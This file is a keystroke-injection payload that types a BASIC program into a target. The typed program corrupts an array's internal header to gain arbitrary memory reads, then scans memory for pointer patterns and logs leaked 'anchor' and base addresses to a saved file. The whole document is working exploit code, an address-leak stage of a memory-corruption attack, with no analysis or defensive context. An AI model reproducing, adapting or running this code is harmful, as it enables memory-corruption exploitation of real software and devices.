REM ns2jb S35 anchor signature scan (reachability test) -- compact TapDucky payload
DEFAULTDELAY 40
DELAY 2500
STRINGLN VAR NSR,V$,D$,S$,A$,X$,OD$,ZERO$,CAP$,I,J
STRINGLN VAR PHASE=0,E0#
STRINGLN ZERO$=CHR$(0)
STRINGLN FOR I=1 TO 18:ZERO$=ZERO$+ZERO$:NEXT
STRINGLN NSR=ARRAY$(4)
STRINGLN COPY NSR[0],0,"0000":COPY NSR[1],0,"1111"
STRINGLN COPY NSR[2],0,"2222":COPY NSR[3],0,"3333"
STRINGLN PRINT "DIST MIN READY",4461
STRINGLN END
STRINGLN COMMON DEF P$(V#)
STRINGLN VAR S$="",J
STRINGLN FOR J=0 TO 3
STRINGLN S$=S$+CHR$(V#-FLOOR(V#/65536)*65536):V#=FLOOR(V#/65536)
STRINGLN NEXT
STRINGLN RETURN S$
STRINGLN END
STRINGLN COMMON DEF U#(S$)
STRINGLN VAR V#=0,J
STRINGLN IF LEN(S$)<4 THEN RETURN 0
STRINGLN FOR J=3 TO 0 STEP -1:V#=V#*65536+ASC(MID$(S$,J,1)):NEXT
STRINGLN RETURN V#
STRINGLN END
STRINGLN COMMON DEF HX$(V#)
STRINGLN VAR S$="",J,A
STRINGLN FOR J=0 TO 11
STRINGLN A=V#-FLOOR(V#/16)*16
STRINGLN S$=MID$("0123456789ABCDEF",A,1)+S$
STRINGLN V#=FLOOR(V#/16)
STRINGLN NEXT
STRINGLN RETURN S$
STRINGLN END
STRINGLN COMMON DEF PLOG(S$)
STRINGLN CAP$=CAP$+S$+CHR$(10)
STRINGLN PRINT S$
STRINGLN IF LEN(CAP$)>900 THEN CAP$=MID$(CAP$,LEN(CAP$)-800)
STRINGLN RETURN ""
STRINGLN END
STRINGLN COMMON DEF AIM(A#,N)
STRINGLN COPY NSR[0],16,P$(A#)+P$(N)
STRINGLN RETURN ""
STRINGLN END
STRINGLN COMMON DEF UNAIM()
STRINGLN IF OD$!="" THEN COPY NSR[0],16,OD$
STRINGLN RETURN ""
STRINGLN END
STRINGLN COMMON DEF RD(A#,N)
STRINGLN VAR S$
STRINGLN X$=AIM(A#,N)
STRINGLN IF LEN(NSR[1])!=N THEN RETURN ""
STRINGLN S$=COPY(NSR[1],0,N)
STRINGLN X$=UNAIM()
STRINGLN RETURN S$
STRINGLN END
STRINGLN COMMON DEF S1()
STRINGLN VAR V#
STRINGLN V$=COPY(NSR[0],0,16)
STRINGLN E0#=U#(LEFT$(V$,4))
STRINGLN OD$=COPY(NSR[0],16,8)
STRINGLN X$=PLOG("W0 "+HX$(E0#))
STRINGLN RETURN 1
STRINGLN END
STRINGLN COMMON DEF S35ANCHOR()
STRINGLN VAR J,N,HIT#=0,X#,Y#,LO#,HI#,A#,B#,D$
STRINGLN FOR N=-1024 TO 2047
STRINGLN A#=E0#+N*256
STRINGLN D$=RD(A#,256)
STRINGLN IF LEN(D$)<256 THEN GOTO @next
STRINGLN FOR J=0 TO 240 STEP 8
STRINGLN LO#=U#(MID$(D$,J,4)):HI#=U#(MID$(D$,J+4,4)):X#=HI#*4294967296+LO#
STRINGLN LO#=U#(MID$(D$,J+8,4)):HI#=U#(MID$(D$,J+12,4)):Y#=HI#*4294967296+LO#
STRINGLN IF Y#-X#==336 AND X#>21474836480 AND X#<2199023255552 THEN
STRINGLN HIT#=HIT#+1
STRINGLN IF HIT#<=20 THEN X$=PLOG("ANCHOR @"+HX$(A#+J)+" X="+HX$(X#)+" M#can="+HX$(X#-1100688))
STRINGLN ENDIF
STRINGLN NEXT
STRINGLN @next:
STRINGLN NEXT
STRINGLN X$=PLOG("ANCHORCOUNT "+STR$(HIT#))
STRINGLN IF CAP$!="" THEN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN RETURN 1
STRINGLN END
